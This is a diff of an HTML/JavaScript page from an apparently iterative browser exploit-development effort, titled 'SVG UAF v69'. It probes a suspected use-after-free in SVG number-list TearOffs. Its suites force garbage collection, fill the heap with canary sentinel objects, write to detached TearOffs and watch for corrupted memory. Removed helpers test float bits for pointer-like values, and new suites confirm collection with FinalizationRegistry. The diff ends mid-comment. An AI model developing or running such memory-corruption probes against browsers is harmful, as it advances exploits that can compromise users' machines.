@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v68 — write to detached TearOff + list-A notification probe</title>
+<title>SVG UAF v69 — FinalizationRegistry GC confirmation + SVGTransform path</title>
 <style>
 *{box-sizing:border-box}
 body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;font-size:12px;padding:12px;margin:0}
@@ -22,13 +22,13 @@ pre{white-space:pre-wrap;word-break:break-all;margin:1px 0;line-height:1.4}
 </style>
 </head>
 <body>
-<h2>SVG UAF v68 — write to detached TearOff · list-A UAF · notification chain · CSS anim probe</h2>
+<h2>SVG UAF v69 — FinalizationRegistry GC probe · SVGTransformList · SVGNumberList bin sentinel</h2>
 <div id="controls">
   <button class="run-all" onclick="runAll()">▶ Run All</button>
-  <button onclick="runSuite('ADR68')">ADR68: Write to detached TearOff → notification UAF probe</button>
-  <button onclick="runSuite('ADR69')">ADR69: Multi-setAttr orphan chain — 20 rounds, release all, check</button>
-  <button onclick="runSuite('ADR70')">ADR70: SVGAnimatedNumber path — feGaussianBlur stdDeviation</button>
-  <button onclick="runSuite('ADR71')">ADR71: CSS animation on SVG feColorMatrix — different codepath</button>
+  <button onclick="runSuite('ADR72')">ADR72: FinalizationRegistry — per-frame animVal TearOff GC confirmation</button>
+  <button onclick="runSuite('ADR73')">ADR73: FinalizationRegistry — orphaned baseVal TearOff GC confirmation</button>
+  <button onclick="runSuite('ADR74')">ADR74: SVGTransformList — SVGMatrix frame-escape test</button>
+  <button onclick="runSuite('ADR75')">ADR75: SVGNumberList bin probe — sentinel TYPE matches freed object type</button>
   <button class="copy-btn" onclick="copyAll()">⎘ Copy All</button>
   <button class="clear-btn" onclick="clearOut()">✕ Clear</button>
 </div>
@@ -59,7 +59,9 @@ function copyAll(){
   var lines=document.getElementById('out').querySelectorAll('pre');
   var text=Array.from(lines).map(function(p){return p.textContent;}).join('\n');
   var toast=document.getElementById('copy-toast');
-  try{navigator.clipboard.writeText(text).then(function(){toast.style.opacity='1';setTimeout(function(){toast.style.opacity='0';},1500);}).catch(function(){fb(text,toast);});}
+  try{navigator.clipboard.writeText(text).then(function(){
+    toast.style.opacity='1';setTimeout(function(){toast.style.opacity='0';},1500);
+  }).catch(function(){fb(text,toast);});}
   catch(e){fb(text,toast);}
 }
 function fb(text,toast){
@@ -72,12 +74,7 @@ function fb(text,toast){
 var _dv=new DataView(new ArrayBuffer(8));
 function f32bits(f){_dv.setFloat32(0,f,true);return _dv.getUint32(0,true);}
 function f32hex(f){return'0x'+f32bits(f).toString(16).padStart(8,'0');}
-function f32exact(v){_dv.setFloat32(0,v,true);return _dv.getFloat32(0,true);}
-function isExactF32(v){return f32exact(v)===v;}
-function f64bits(f){_dv.setFloat64(0,f,true);return{lo:_dv.getUint32(0,true),hi:_dv.getUint32(4,true)};}
-function f64hex(f){var b=f64bits(f);return'0x'+b.hi.toString(16).padStart(8,'0')+b.lo.toString(16).padStart(8,'0');}
-function isPointerLike32(u){return u>=0x4F000000&&u<=0x52FFFFFF;}
-function isPointerBits64(f){if(!isFinite(f)||isNaN(f))return false;var b=f64bits(f);return b.hi>=0x00000001&&b.hi<=0x00007fff;}
+function isExactF32(v){_dv.setFloat32(0,v,true);return _dv.getFloat32(0,true)===v;}
 
 function gcHard(){
   var a=[];for(var i=0;i<500000;i++)a.push({x:i});a=null;
@@ -92,16 +89,6 @@ function gcDOM(){
   for(var j=0;j<500;j++){var s=document.createElementNS(SVG_NS,'svg');document.body.appendChild(s);s.remove();}
 }
 function gcFull(){gcHard();gcDOM();gcHard();}
-
-function makeSentinelFe(id,val){
-  var svg=document.createElementNS(SVG_NS,'svg');document.body.appendChild(svg);
-  var fe=document.createElementNS(SVG_NS,'feColorMatrix');
-  fe.setAttribute('type','matrix');
-  var v=[];for(var i=0;i<20;i++)v.push(i===0?val:0);
-  fe.setAttribute('values',v.join(' '));
-  svg.appendChild(fe);
-  return{svg:svg,fe:fe,t:fe.values.baseVal.getItem(0),canary:val};
-}
 
 function makeLiveAnimFe(id,from0,to0,dur){
   var svg=document.createElementNS(SVG_NS,'svg');
@@ -122,7 +109,7 @@ function makeLiveAnimFe(id,from0,to0,dur){
   var toVals=[];for(var i=0;i<20;i++)toVals.push(i===0?to0:0);
   anim.setAttribute('from',vals.join(' '));
   anim.setAttribute('to',toVals.join(' '));
-  anim.setAttribute('dur',(dur||5)+'s');
+  anim.setAttribute('dur',(dur||8)+'s');
   anim.setAttribute('repeatCount','indefinite');
   fe.appendChild(anim);
   try{anim.beginElement();}catch(e){}
@@ -136,610 +123,562 @@ function runSuite(name){
   catch(e){L('[SUITE CRASH] '+name+': '+(e&&e.stack?e.stack:String(e)),'miss');}
 }
 function runAll(){
-  ['ADR68','ADR69','ADR70','ADR71'].forEach(function(n){runSuite(n);});
+  ['ADR72','ADR73','ADR74','ADR75'].forEach(function(n){runSuite(n);});
 }
 
 // ═══════════════════════════════════════════════════════════════
-// ADR68 — WRITE to detached (orphaned) TearOff → notification chain UAF probe
+// ADR72 — FinalizationRegistry: per-frame animVal TearOff GC confirmation
 //
-// All v67 tests were READ-only. We never wrote to a detached TearOff.
+// The definitive test: does SMIL hold a RefPtr to the per-frame SVGNumber?
 //
-// When you WRITE to a TearOff (tearoff.value = X), the C++ SVGNumber:
-//  1. Updates its m_value field
-//  2. Calls notifyParentList() → fires on owner SVGNumberList
-//  3. Owner list calls notifyOwner() → fires on owner SVGElement
-//  4. SVGElement calls svgAttributeChanged() → DOM notification
+// FinalizationRegistry fires its callback when a JS object is GC'd.
+// We register each per-frame animVal TearOff with a token.
+// After releasing the TearOff and forcing GC, if the callback fires:
+//   → JS wrapper (TearOff) was GC'd
+//   → BUT: the C++ SVGNumber may still be alive (SMIL holds RefPtr to it)
+//   → The JS TearOff being GC'd does not directly tell us if the C++ SVGNumber is freed
 //
-// After setAttributeNS:
-//  - Old TearOff T_old → points to SVGNumber_old in list_A
-//  - list_A was REPLACED by list_B (new list after setAttributeNS)
-//  - list_A reference: is it freed? held by feColorMatrix? by TearOff?
+// So we need to think carefully about what FinalizationRegistry measures:
+// - It tracks JAVASCRIPT object death (when the JS object becomes unreachable)
+// - The C++ SVGNumber has independent lifetime via RefCounting
+// - The JS TearOff being GC'd just means WebKit's JSC GC reclaimed the JS wrapper
+// - The underlying C++ SVGNumber might still be alive
 //
-// The TearOff holds RefPtr<SVGNumber_old> but does NOT hold RefPtr<list_A>
-// The SVGNumber_old holds a raw/weak backptr to list_A for notifications
-// If list_A is freed (refcount hits 0 when feColorMatrix replaced it with list_B):
-//   → T_old.value = 99999
-//   → SVGNumber_old.notifyParentList() → WRITES TO FREED list_A → UAF!
+// However: when the JS TearOff IS GC'd, its JS destructor runs.
+// The JS destructor typically calls the C++ TearOff destructor.
+// The C++ TearOff destructor releases its RefPtr<SVGNumber>.
+// IF SMIL holds no other RefPtr to that SVGNumber, refcount → 0 → freed.
 //
-// Test:
-// 1. Create feColorMatrix, animate it
-// 2. Collect baseVal TearOff T_bv (20 items, grab item 0)
-// 3. setAttributeNS → T_bv detached, list_A replaced by list_B
-// 4. Alloc 200 exact-canary sentinels (hoping list_A's slot is reused by one)
-// 5. GC heavily (to free list_A if no other holder)
-// 6. WRITE T_bv.value = 99999 ← THE KEY ACTION
-// 7. Immediately check all 200 sentinels for corruption
-// 8. Wait 3 SMIL frames, re-check
+// So: FinalizationRegistry firing = JS TearOff freed = C++ TearOff released
+//   = C++ TearOff's RefPtr<SVGNumber> decremented
+//   IF SMIL holds no RefPtr: SVGNumber freed (UAF possible)
+//   IF SMIL holds RefPtr: SVGNumber NOT freed (no UAF)
 //
-// Corruption = list_A's freed slot was overwritten by the notification write
+// We can't directly detect if the C++ SVGNumber is freed from JS.
+// BUT we can check: does the SMIL animation continue correctly after GC?
+// IF animVal.getItem(0).value still changes smoothly after GC of old TearOffs:
+//   → SMIL has its own access to the animated value (its own RefPtr path)
+//   → Old TearOff's GC didn't break SMIL → SMIL holds RefPtr independently
 //
-// Also: T_bv.value before/after write — does the write stick on a detached TearOff?
+// Test design:
+// 1. Start animation
+// 2. Collect 20 per-frame TearOffs, register each with FinalizationRegistry
+// 3. Release all TearOffs in IIFE
+// 4. Force GC 3x
+// 5. Check: how many FinalizationRegistry callbacks fired?
+// 6. Check: is animation still running? (does animVal still update?)
+// 7. Conclusion: if all 20 fired → JS TearOffs GC'd → C++ TearOffs destructed
+//    → SMIL's independent RefPtr is the only survivor
 // ═══════════════════════════════════════════════════════════════
-suites['ADR68']=function(){
-  L('ADR68: Write to detached TearOff — notification chain UAF probe','info');
+suites['ADR72']=function(){
+  L('ADR72: FinalizationRegistry — per-frame animVal TearOff GC confirmation','info');
 
-  // Part A: static feColorMatrix (no animation) — cleaner test first
-  L('ADR68-A: static feColorMatrix write-after-setAttr','info');
-  var svgA=document.createElementNS(SVG_NS,'svg');document.body.appendChild(svgA);
-  var feA=document.createElementNS(SVG_NS,'feColorMatrix');
-  feA.setAttribute('type','matrix');
-  var initVals=[];for(var i=0;i<20;i++)initVals.push(i===0?5000:0);
-  feA.setAttribute('values',initVals.join(' '));
-  svgA.appendChild(feA);
-
-  // Capture baseVal TearOff BEFORE setAttributeNS
-  var T_bv=feA.values.baseVal.getItem(0);
-  L('ADR68-A: T_bv.value before setAttr='+T_bv.value,'info');
-
-  // Alloc 200 sentinels BEFORE setAttributeNS (fills space before list_A freed)
-  var sentsA=[];
-  for(var i=0;i<200;i++){
-    sentsA.push(makeSentinelFe('a68_'+i,(i+1)*100));
+  // Check FinalizationRegistry support
+  if(typeof FinalizationRegistry==='undefined'){
+    L('ADR72: FinalizationRegistry NOT supported in this runtime','miss');
+    return;
   }
-  L('ADR68-A: 200 pre-setAttr sentinels allocated (100..20000)','info');
+  L('ADR72: FinalizationRegistry IS supported','hit');
 
-  // setAttributeNS — detaches T_bv, creates new list, old list hopefully freed
-  var newVals=[];for(var i=0;i<20;i++)newVals.push(i===0?9999:0);
-  feA.setAttributeNS(null,'values',newVals.join(' '));
-
-  // Check: is T_bv still reading old value?
-  L('ADR68-A: T_bv.value after setAttr='+T_bv.value+' (should be 5000, detached)','info');
-  var freshBv=feA.values.baseVal.getItem(0);
-  L('ADR68-A: fresh getItem(0) after setAttr='+freshBv.value+' (should be 9999)','info');
-  L('ADR68-A: T_bv===fresh? '+(T_bv===freshBv),'info');
-
-  // Alloc 200 more sentinels AFTER setAttributeNS (might land at list_A freed slot)
-  var sentsB=[];
-  for(var i=0;i<200;i++){
-    sentsB.push(makeSentinelFe('b68_'+i,(i+201)*100));
-  }
-  L('ADR68-A: 200 post-setAttr sentinels allocated (20100..40000)','info');
-
-  // Heavy GC
-  gcFull();gcFull();gcFull();
-
-  // NOW WRITE to the detached TearOff — THE KEY ACTION
-  L('ADR68-A: *** WRITING T_bv.value = 99999 (write to detached TearOff) ***','warn');
-  var beforeWrite=T_bv.value;
-  try{
-    T_bv.value=99999;
-  }catch(e){
-    L('ADR68-A: write threw exception: '+e.message,'miss');
-  }
-  L('ADR68-A: T_bv.value after write attempt='+T_bv.value,'info');
-  L('ADR68-A: write stuck? '+(T_bv.value===99999),'info');
-
-  // Check all sentinels immediately
-  var corruptA=[],corruptB=[];
-  sentsA.forEach(function(s,i){
-    var expected=(i+1)*100;
-    if(Math.abs(s.t.value-expected)>0.5) corruptA.push({i:i,expected:expected,got:s.t.value});
-  });
-  sentsB.forEach(function(s,i){
-    var expected=(i+201)*100;
-    if(Math.abs(s.t.value-expected)>0.5) corruptB.push({i:i,expected:expected,got:s.t.value});
+  var gcCount=0;
+  var gcTokens=[];
+  var registry72=new FinalizationRegistry(function(token){
+    gcCount++;
+    gcTokens.push(token);
+    L('  FinalizationRegistry: GC callback fired for token='+token+' (total gcCount='+gcCount+')','warn');
   });
 
-  if(corruptA.length>0){
-    L('★★★ ADR68-A: PRE-sentinels CORRUPTED after write! count='+corruptA.length,'hit');
-    corruptA.slice(0,5).forEach(function(x){L('  pre-S['+x.i+']: expected '+x.expected+' got '+x.got.toFixed(3)+' bits='+f32hex(x.got),'hit');});
-  } else {
-    L('ADR68-A: all 200 pre-sentinels intact','info');
-  }
-  if(corruptB.length>0){
-    L('★★★ ADR68-A: POST-sentinels CORRUPTED after write! count='+corruptB.length,'hit');
-    corruptB.slice(0,5).forEach(function(x){L('  post-S['+x.i+']: expected '+x.expected+' got '+x.got.toFixed(3)+' bits='+f32hex(x.got),'hit');});
-  } else {
-    L('ADR68-A: all 200 post-sentinels intact','info');
-  }
-
-  // Part B: same test but with animation running
-  L('','');
-  L('ADR68-B: animated feColorMatrix write-after-setAttr (SMIL running)','info');
-  var ctx=makeLiveAnimFe('f68',3000,0,8);
+  var ctx72=makeLiveAnimFe('f72',5000,0,10);
+  var frame72=0;
+  var collected72=[];
 
   setTimeout(function(){
-    // Collect baseVal TearOff during animation
-    var T_bvB=ctx.fe.values.baseVal.getItem(0);
-    var avBefore=ctx.fe.values.animVal.getItem(0).value;
-    L('ADR68-B: T_bvB.value='+T_bvB.value+' av='+avBefore.toFixed(3),'info');
+    L('ADR72: collecting 20 per-frame animVal TearOffs with FinalizationRegistry...','info');
 
-    // Alloc 200 post-setAttr sentinels BEFORE setAttr
-    var sentsC=[];
-    for(var i=0;i<200;i++) sentsC.push(makeSentinelFe('c68_'+i,(i+401)*100));
-    L('ADR68-B: 200 sentinels allocated before setAttr','info');
-
-    // setAttributeNS mid-animation
-    var newV2=[];for(var i=0;i<20;i++)newV2.push(i===0?7777:0);
-    ctx.fe.setAttributeNS(null,'values',newV2.join(' '));
-
-    L('ADR68-B: T_bvB after setAttr='+T_bvB.value+' (detached, should be 3000)','info');
-    var freshB2=ctx.fe.values.baseVal.getItem(0);
-    L('ADR68-B: fresh bv='+freshB2.value+' (should be 7777)','info');
-
-    gcFull();gcFull();
-
-    // WRITE to detached TearOff with animation running
-    L('ADR68-B: *** WRITING T_bvB.value = 11111 during active animation ***','warn');
-    try{T_bvB.value=11111;}catch(e){L('ADR68-B: write threw: '+e.message,'miss');}
-    L('ADR68-B: T_bvB.value after write='+T_bvB.value,'info');
-    L('ADR68-B: write stuck? '+(T_bvB.value===11111),'info');
-
-    // Check sentinels immediately
-    var corruptC=[];
-    sentsC.forEach(function(s,i){
-      var expected=(i+401)*100;
-      if(Math.abs(s.t.value-expected)>0.5) corruptC.push({i:i,expected:expected,got:s.t.value});
-    });
-    if(corruptC.length>0){
-      L('★★★ ADR68-B: sentinels CORRUPTED after write to detached TearOff!','hit');
-      corruptC.slice(0,5).forEach(function(x){L('  C['+x.i+']: expected '+x.expected+' got '+x.got.toFixed(3)+' bits='+f32hex(x.got),'hit');});
-    } else {
-      L('ADR68-B: all 200 sentinels intact after write','info');
+    function collect72(){
+      var t=ctx72.fe.values.animVal.getItem(0);
+      registry72.register(t,'frame_'+frame72);
+      // IIFE to release immediately (truly zero refs except registry)
+      (function(tearoff){tearoff=null;})(t);
+      t=null;
+      frame72++;
+      if(frame72<20) requestAnimationFrame(collect72);
+      else afterCollect72();
     }
 
-    // Check if SMIL is still running (did the write break animation?)
-    requestAnimationFrame(function(){
-      var avAfter=ctx.fe.values.animVal.getItem(0).value;
-      L('ADR68-B: animVal after write='+avAfter.toFixed(3)+' (animation still running?)','info');
-    });
+    function afterCollect72(){
+      L('ADR72: 20 TearOffs collected and released. Forcing 3x gcFull...','info');
 
-    // Wait 3 SMIL frames and re-check
-    var fw=0;
-    function watchPost(){
-      fw++;
-      var corruptLate=[];
-      sentsC.forEach(function(s,i){
-        var expected=(i+401)*100;
-        if(Math.abs(s.t.value-expected)>0.5) corruptLate.push({i:i,expected:expected,got:s.t.value});
-      });
-      if(corruptLate.length>0){
-        L('★★★ ADR68-B frame+'+fw+': LATE CORRUPTION! count='+corruptLate.length,'hit');
-        corruptLate.forEach(function(x){L('  C['+x.i+']: '+x.expected+' → '+x.got.toFixed(3)+' bits='+f32hex(x.got),'hit');});
-      }
-      if(fw<3) requestAnimationFrame(watchPost);
-      else {
-        L('ADR68-B: 3 frames watched, total corruptions=0 (clean)','info');
-        sentsA.forEach(function(s){s.svg.remove();});
-        sentsB.forEach(function(s){s.svg.remove();});
-        sentsC.forEach(function(s){s.svg.remove();});
-        svgA.remove();
-        ctx.svg.remove();
-      }
-    }
-    requestAnimationFrame(watchPost);
-  },200);
-};
+      // Force GC 3 times
+      gcFull();
+      var c1=gcCount;
+      L('ADR72: after gcFull#1: gcCount='+c1,'info');
+      gcFull();
+      var c2=gcCount;
+      L('ADR72: after gcFull#2: gcCount='+c2,'info');
+      gcFull();
+      var c3=gcCount;
+      L('ADR72: after gcFull#3: gcCount='+c3,'info');
 
-// ═══════════════════════════════════════════════════════════════
-// ADR69 — Multi-setAttributeNS orphan chain accumulation
-//
-// Each setAttributeNS creates a new list, orphaning the previous TearOff.
-// 20 rounds → 20 orphaned TearOffs, each holding a ref to a different
-// old SVGNumber from a different old list.
-//
-// Critical question: do the OLD lists (list_0, list_1... list_18) get freed?
-// Each setAttributeNS creates list_N+1, detaches list_N.
-// If feColorMatrix holds ONLY the CURRENT list: list_0..18 might be freed.
-// If it holds all historical lists: none freed.
-//
-// Then: release all 20 TearOffs → freed SVGNumbers from freed lists?
-// Write to each orphaned TearOff BEFORE releasing.
-// Check if notifications go to freed list objects.
-//
-// Also: measure if writing to orphaned TearOff changes the live feColorMatrix
-// (it should NOT if properly detached). Confirms the orphan is truly isolated.
-// ═══════════════════════════════════════════════════════════════
-suites['ADR69']=function(){
-  L('ADR69: Multi-setAttr orphan chain — 20 TearOffs orphaned, all written to','info');
+      // Wait for microtask/macrotask queue to drain (FinalizationRegistry fires async)
+      setTimeout(function(){
+        var finalCount=gcCount;
+        L('ADR72: final gcCount after setTimeout drain='+finalCount,'info');
+        L('ADR72: total GC callbacks received: '+finalCount+'/20','info');
 
-  var svg69=document.createElementNS(SVG_NS,'svg');document.body.appendChild(svg69);
-  var fe69=document.createElementNS(SVG_NS,'feColorMatrix');
-  fe69.setAttribute('type','matrix');
-  var init69=[];for(var i=0;i<20;i++)init69.push(0);
-  init69[0]=1000;
-  fe69.setAttribute('values',init69.join(' '));
-  svg69.appendChild(fe69);
-
-  // 200 canary sentinels before we start
-  var sents69=[];
-  for(var i=0;i<200;i++) sents69.push(makeSentinelFe('d69_'+i,(i+1)*50));
-  L('ADR69: 200 sentinels allocated (50..10000)','info');
-
-  var orphans=[];
-  var writeResults=[];
-
-  // 20 rounds: collect TearOff, setAttributeNS, repeat
-  for(var round=0;round<20;round++){
-    var T=fe69.values.baseVal.getItem(0);
-    orphans.push({t:T,val:T.value,round:round});
-
-    // setAttributeNS with new value
-    var nv=[];for(var i=0;i<20;i++)nv.push(i===0?(round+1)*1000+500:0);
-    fe69.setAttributeNS(null,'values',nv.join(' '));
-  }
-
-  L('ADR69: 20 TearOffs orphaned across 20 setAttributeNS rounds','info');
-  L('ADR69: orphan[0].value='+orphans[0].val+' orphan[19].value='+orphans[19].val,'info');
-
-  // Verify orphans still readable (RefPtr protection)
-  var allReadable=orphans.every(function(o){return typeof o.t.value==='number'&&!isNaN(o.t.value);});
-  L('ADR69: all orphans still readable? '+allReadable,'info');
-
-  // Heavy GC BEFORE writes (attempt to free old lists)
-  gcFull();gcFull();gcFull();
-
-  // Check sentinels BEFORE writes
-  var preBad=[];
-  sents69.forEach(function(s,i){
-    var expected=(i+1)*50;
-    if(Math.abs(s.t.value-expected)>0.5) preBad.push({i:i,expected:expected,got:s.t.value});
-  });
-  L('ADR69: sentinels before write: '+(preBad.length===0?'ALL OK':preBad.length+' BAD!'),'info');
-
-  // NOW WRITE TO ALL 20 ORPHANED TEAROFFS
-  L('ADR69: *** WRITING to all 20 orphaned TearOffs ***','warn');
-  orphans.forEach(function(o,i){
-    try{o.t.value=(i+1)*11111;}
-    catch(e){writeResults.push({i:i,err:e.message});}
-  });
-  L('ADR69: write errors: '+writeResults.length,'info');
-  L('ADR69: orphan[0].value after write='+orphans[0].t.value,'info');
-  L('ADR69: orphan[19].value after write='+orphans[19].t.value,'info');
-
-  // Did any write affect the LIVE feColorMatrix?
-  var liveBv=fe69.values.baseVal.getItem(0).value;
-  L('ADR69: live feColorMatrix bv[0] after writes='+liveBv+' (should be 20500, unchanged)','info');
-  if(Math.abs(liveBv-20500)<0.5){
-    L('ADR69: live bv unchanged — orphan writes did NOT affect live element','info');
-  } else {
-    L('★ ADR69: live bv CHANGED to '+liveBv+' — write leaked through to live element!','warn');
-  }
-
-  // Check sentinels AFTER writes
-  var postBad=[];
-  sents69.forEach(function(s,i){
-    var expected=(i+1)*50;
-    if(Math.abs(s.t.value-expected)>0.5) postBad.push({i:i,expected:expected,got:s.t.value});
-  });
-
-  if(postBad.length>0){
-    L('★★★ ADR69: '+postBad.length+' SENTINELS CORRUPTED after 20 orphan writes!','hit');
-    postBad.slice(0,8).forEach(function(x){
-      L('  S['+x.i+']: expected '+x.expected+' got '+x.got.toFixed(3)+' bits='+f32hex(x.got),'hit');
-    });
-  } else {
-    L('ADR69: all 200 sentinels intact after 20 orphan writes','info');
-  }
-
-  // Now release all orphans and GC
-  (function(){
-    var refs=orphans;
-    orphans=null;
-    for(var i=0;i<refs.length;i++){refs[i].t=null;refs[i]=null;}
-  })();
-  gcFull();gcFull();
-
-  // Alloc 200 probes AFTER releasing orphans
-  var probes69=[];
-  for(var i=0;i<200;i++) probes69.push(makeSentinelFe('e69_'+i,(i+201)*50));
-  L('ADR69: 200 probes allocated after orphan release (10050..20000)','info');
-
-  var probeBad=[];
-  probes69.forEach(function(p,i){
-    var expected=(i+201)*50;
-    if(Math.abs(p.t.value-expected)>0.5) probeBad.push({i:i,expected:expected,got:p.t.value});
-  });
-  if(probeBad.length>0){
-    L('★★★ ADR69: '+probeBad.length+' PROBES have wrong init values! (IsoHeap free list reuse)','hit');
-    probeBad.slice(0,5).forEach(function(x){L('  P['+x.i+']: expected '+x.expected+' got '+x.got.toFixed(3),'hit');});
-  } else {
-    L('ADR69: all 200 probes correct (bump-only IsoHeap confirmed again)','info');
-  }
-
-  sents69.forEach(function(s){s.svg.remove();});
-  probes69.forEach(function(p){p.svg.remove();});
-  svg69.remove();
-};
-
-// ═══════════════════════════════════════════════════════════════
-// ADR70 — SVGAnimatedNumber path (feGaussianBlur stdDeviation)
-//
-// feGaussianBlur.stdDeviation is SVGAnimatedNumber — a SINGLE float, not a list.
-// Different C++ class hierarchy from SVGAnimatedNumberList.
-// In WebKit: SVGAnimatedNumber → backed by SVGNumber (same class)
-// But the TearOff/list ownership model is simpler (no list backing vector).
-//
-// Test the same frame-escape pattern on SVGAnimatedNumber:
-// 1. Animate feGaussianBlur stdDeviation with SMIL
-// 2. Collect animVal TearOff mid-animation
-// 3. Wait 5 frames
-// 4. Release TearOff + gcFull
-// 5. Alloc sentinel
-// 6. Watch 5 frames
-// 7. Also test: write to detached baseVal TearOff after setAttributeNS
-//
-// Different from feColorMatrix: stdDeviation takes a single float, not a matrix.
-// The animVal of stdDeviation is a single SVGNumber (not SVGNumberList).
-// ═══════════════════════════════════════════════════════════════
-suites['ADR70']=function(){
-  L('ADR70: SVGAnimatedNumber path — feGaussianBlur stdDeviation','info');
-
-  // Create a feGaussianBlur with animated stdDeviation
-  var svg70=document.createElementNS(SVG_NS,'svg');
-  svg70.setAttribute('width','200');svg70.setAttribute('height','200');
-  document.body.appendChild(svg70);
-  var defs70=document.createElementNS(SVG_NS,'defs');svg70.appendChild(defs70);
-  var filt70=document.createElementNS(SVG_NS,'filter');filt70.id='f70';defs70.appendChild(filt70);
-
-  var blur=document.createElementNS(SVG_NS,'feGaussianBlur');
-  blur.setAttribute('stdDeviation','100');
-  filt70.appendChild(blur);
-
-  var rect70=document.createElementNS(SVG_NS,'rect');
-  rect70.setAttribute('width','100');rect70.setAttribute('height','100');
-  rect70.setAttribute('filter','url(#f70)');
-  svg70.appendChild(rect70);
-
-  // Animate stdDeviation from 100 to 0
-  var anim70=document.createElementNS(SVG_NS,'animate');
-  anim70.setAttribute('attributeName','stdDeviation');
-  anim70.setAttribute('from','100');
-  anim70.setAttribute('to','0');
-  anim70.setAttribute('dur','10s');
-  anim70.setAttribute('repeatCount','indefinite');
-  blur.appendChild(anim70);
-  try{anim70.beginElement();}catch(e){}
-
-  setTimeout(function(){
-    // Check: does stdDeviation have animVal?
-    // In WebKit, SVGAnimatedNumber exposes .animVal which is a read-only SVGNumber
-    var sdBaseVal=blur.stdDeviation;
-    L('ADR70: blur.stdDeviation type='+typeof sdBaseVal,'info');
-
-    // Try to get animVal TearOff
-    // Note: stdDeviation on feGaussianBlur is SVGAnimatedLength or SVGAnimatedNumber
-    // The .animVal property should be an SVGNumber TearOff
-    var avTear70=null;
-    try{
-      // blur.stdDeviation is SVGAnimatedNumber
-      // blur.stdDeviation.animVal is SVGNumber (read-only)
-      avTear70=blur.stdDeviation.animVal;
-      L('ADR70: stdDeviation.animVal='+avTear70,'info');
-      // Actually in WebKit, stdDeviation might be an SVGAnimatedNumberOptionalNumber
-      // .animVal returns a primitive number, not an object
-    }catch(e){
-      L('ADR70: stdDeviation.animVal threw: '+e.message,'miss');
-    }
-
-    // Alternative: feGaussianBlur.stdDeviation returns an SVGAnimatedNumber
-    // which has .animVal as a READONLY SVGNumber interface object
-    // Let's try the SVGAnimatedNumber.animVal approach
-    try{
-      var sdAnimated=blur.stdDeviation; // should be SVGAnimatedNumber
-      L('ADR70: sdAnimated='+sdAnimated,'info');
-      // .animVal should be an SVGNumber (has .value property)
-      if(sdAnimated && typeof sdAnimated==='object'){
-        L('ADR70: sdAnimated.animVal='+sdAnimated.animVal,'info');
-        L('ADR70: sdAnimated.baseVal='+sdAnimated.baseVal,'info');
-      }
-    }catch(e){
-      L('ADR70: access threw: '+e.message,'miss');
-    }
-
-    // The feGaussianBlur approach might differ. Let's use SVGFEGaussianBlurElement
-    // which has stdDeviationX and stdDeviationY as SVGAnimatedNumber
-    try{
-      var sdX=blur.stdDeviationX; // SVGAnimatedNumber interface
-      if(sdX){
-        L('ADR70: stdDeviationX.baseVal.value='+sdX.baseVal.value,'info');
-        L('ADR70: stdDeviationX.animVal.value='+sdX.animVal.value,'info');
-        var T70=sdX.animVal; // SVGNumber object (has .value)
-        L('ADR70: T70.value='+T70.value,'info');
-
-        // Frame-escape test with SVGAnimatedNumber
-        requestAnimationFrame(function(){
-          var v0=sdX.animVal.value;
-          L('ADR70: frame0 sdX.animVal='+v0.toFixed(3),'info');
-
-          // collect and hold
-          var held={t:sdX.animVal,v:sdX.animVal.value};
-          L('ADR70: held animVal TearOff, v='+held.v.toFixed(3),'info');
-
-          var skip70=0;
-          function skipF70(){
-            skip70++;
-            var cur=sdX.animVal.value;
-            L('  frame+'+skip70+' sdX.animVal='+cur.toFixed(3)+' held.t.value='+held.t.value.toFixed(3),'info');
-            if(skip70<5){requestAnimationFrame(skipF70);return;}
-
-            // Release held TearOff
-            (function(h){h.t=null;})(held);held=null;
-            gcFull();gcFull();
-            L('ADR70: held TearOff released + 2x gcFull','info');
-
-            // Alloc sentinel
-            var S70=makeSentinelFe('s70',54321);
-            L('ADR70: sentinel S70 (canary=54321): S70.t.value='+S70.t.value,'info');
-
-            var fw70=0;
-            function watch70(){
-              fw70++;
-              var sv=S70.t.value;
-              var cur2=sdX.animVal.value;
-              if(sv!==54321){
-                L('★★★ ADR70 frame+'+fw70+': S70 CORRUPTED! was 54321 now '+sv.toFixed(3)+' bits='+f32hex(sv),'hit');
-              } else {
-                L('  frame+'+fw70+' S70=54321 intact, sdX='+cur2.toFixed(3),'info');
-              }
-              if(fw70<5) requestAnimationFrame(watch70);
-              else {
-                L('ADR70: 5 frames watched, S70.final='+S70.t.value,'info');
-
-                // Part B: write to detached baseVal TearOff of stdDeviation
-                L('ADR70-B: write to detached stdDeviation baseVal TearOff','info');
-                var bvTear70=sdX.baseVal; // SVGNumber (baseVal)
-                L('ADR70-B: bvTear70.value='+bvTear70.value,'info');
-
-                // setAttributeNS to detach
-                blur.setAttributeNS(null,'stdDeviation','999');
-                L('ADR70-B: after setAttributeNS(999): bvTear70.value='+bvTear70.value+' (detached?)','info');
-                var freshBv70=sdX.baseVal.value;
-                L('ADR70-B: fresh sdX.baseVal.value='+freshBv70,'info');
-
-                try{bvTear70.value=12345;}
-                catch(e){L('ADR70-B: write threw: '+e.message,'miss');}
-                L('ADR70-B: bvTear70.value after write='+bvTear70.value,'info');
-                L('ADR70-B: live sdX.baseVal after write='+sdX.baseVal.value,'info');
-                L('ADR70-B: write leaked to live? '+(Math.abs(sdX.baseVal.value-12345)<0.5),'info');
-
-                S70.svg.remove();svg70.remove();
-              }
-            }
-            requestAnimationFrame(watch70);
-          }
-          requestAnimationFrame(skipF70);
-        });
-      } else {
-        L('ADR70: stdDeviationX is null — SVGAnimatedNumber not exposed on this element','miss');
-        svg70.remove();
-      }
-    }catch(e){
-      L('ADR70: stdDeviationX threw: '+e.message,'miss');
-      svg70.remove();
-    }
-  },200);
-};
-
-// ═══════════════════════════════════════════════════════════════
-// ADR71 — CSS animation on SVG feColorMatrix values
-//
-// CSS Animations (@keyframes + animation property) go through a completely
-// different WebKit codepath from SMIL:
-// - SMIL: SMILTimeContainer, SVGAnimateElement, SVGAnimatedTypeAnimator
-// - CSS: AnimationController, KeyframeAnimation, RenderStyle
-//
-// CSS animations on SVG presentation attributes may use a different
-// ownership model. Specifically: CSS animation might hold raw pointers
-// to SVGNumber objects rather than RefPtrs, because the CSS layer
-// doesn't go through WebKit's SVG RefCounted TearOff system.
-//
-// Test:
-// 1. Create feColorMatrix with CSS @keyframes on 'values'
-// 2. Get animVal TearOff during CSS animation
-// 3. Check: does animVal even update during CSS animation? (might not)
-// 4. If it updates: same frame-escape + sentinel write test
